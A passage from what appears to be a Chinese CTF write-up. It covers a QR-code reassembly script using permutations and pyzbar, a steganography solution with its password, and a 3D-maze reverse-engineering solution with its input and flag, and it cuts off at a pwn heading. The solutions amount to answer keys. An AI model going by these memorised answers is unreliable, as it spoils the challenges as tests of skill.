class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]]<br><br><span class="hljs-keyword">import</span> pyzbar.pyzbar <span class="hljs-keyword">as</span> pyzbar<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageDraw <span class="hljs-keyword">as</span> draw<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>shuffle_1 = [<span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>]<br>shuffle_2 = [<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>]<br>head = data[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]<br>tail = data[<span class="hljs-number">20</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">body</span>(<span class="hljs-params">body_1, body_2</span>):<br>    body = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        body.append(body_1[i])<br>        body.append(body_2[i])<br>    body.append(body_1[<span class="hljs-number">5</span>])<br>    <span class="hljs-keyword">return</span> [data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> body]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_img</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">29</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data[<span class="hljs-number">0</span>]) == <span class="hljs-number">29</span><br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">31</span>, <span class="hljs-number">31</span>), (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">for</span> i, row <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>        <span class="hljs-keyword">for</span> j, pixel <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(row):<br>            img.putpixel((j + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>), (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">with</span> tqdm(total=<span class="hljs-number">720</span> * <span class="hljs-number">120</span>) <span class="hljs-keyword">as</span> pbar:<br>    <span class="hljs-keyword">for</span> body_1 <span class="hljs-keyword">in</span> permutations(shuffle_1):<br>        <span class="hljs-keyword">for</span> body_2 <span class="hljs-keyword">in</span> permutations(shuffle_2):<br>            im = draw_img(head + body(body_1, body_2) + tail)<br>            barcodes = pyzbar.decode(im)<br>            pbar.update(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(barcodes) == <span class="hljs-number">0</span>):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> barcode <span class="hljs-keyword">in</span> barcodes:<br>                barcodeData = barcode.data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                <span class="hljs-built_in">print</span>(barcodeData)<br>                plt.imshow(im)<br>                plt.show()<br></code></pre></td></tr></table></figure><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>binwalk分理出一个压缩包</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc3-1.png"></p><p>还是lsb解密，密码在图片结尾，<code>7his_1s_p4s5w0rd</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc3-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc3-3.png"></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>通过gdb动态调试获取地图的全貌</p><p>0层<br> 0  1  1  1 1  1  1  1<br> 0  0  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p><p>1层<br> 1  1  1  1 1  1  1  1<br> 1  1  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p><p>2层<br> 1  1  1  1 1  1  1  1<br> 1  1  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1</p><p>3层<br> 1  1  1  1 1  1  1  1<br> 1  1  0  0 1  1  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 1  0  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 0  0  1  1<br> 1  1  1  1 1  1  1  1</p><p>4层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p><p>5层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p><p>6层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  0  0<br> 1  1  1  1 1  1  1  0</p><p>7层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  0</p><p><code>511=64*7+63</code>所以程序要求从第0层的开头走到第7层的结尾</p><p>分别通过<code>a-下，b-上，l-左，r-右，u-下一层，d-上一层</code>进行移动</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-reverse2-1.png"></p><p>input: <code>arruuuraaaaarrdbbuuuuuaadrrau</code></p><p>flag：<code>flag&#123;6c2a5b75-232d-26ea-c3cc-8f7a924d7357&#125;</code></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>利用创建<code>chunk</code>时的<code>off by 